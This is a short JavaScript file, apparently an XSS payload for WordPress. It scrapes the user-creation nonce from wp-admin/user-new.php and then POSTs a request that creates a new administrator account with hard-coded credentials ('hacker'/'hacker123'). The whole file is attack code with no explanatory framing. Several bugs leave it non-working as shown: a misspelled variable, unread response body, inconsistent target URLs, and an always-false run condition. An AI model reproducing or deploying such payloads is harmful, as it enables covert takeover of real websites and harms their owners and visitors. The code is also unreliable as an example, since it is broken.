// Settings
const usuername = 'hacker';
const password = 'hacker123';
const email = 'hacker@hacker.com';

// Get nonce
async function getNonce() {
  let html = await fetch(window.location.hostname + '/wp-admin/user-new.php', {
    headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"'
    }
  });
  
  // Regex grep nonce
  const start = '_wpnonce_create-user" value="';
  const end = '"';
  const result = html.match(new RegExp(start + "(.*?)" + end));

  // return nonce
  return result[1];
}

async function createUser(username, password, email, nonce) {
  fetch('http://localhost/wp-admin/user-new.php', {
    method: 'POST',
    headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"'
    },
    body: new URLSearchParams({
      'action': 'createuser',
      '_wpnonce_create-user': nonce,
      '_wp_http_referer': '/wp-admin/user-new.php',
      'user_login': username,
      'email': email,
      'first_name': '',
      'last_name': '',
      'url': '',
      'pass1': password,
      'pass2': password,
      'pw_weak': 'on',
      'role': 'administrator',
      'createuser': 'Add New User'
    })
  });
}

if (1 == 2) {
  console.log('running...');
  getNonce().then((nonce) => {
    createUser(username, password, email, nonce).then((resp) => {
      console.log('user created');
    });
  });
} else {
  console.log('hej');
}

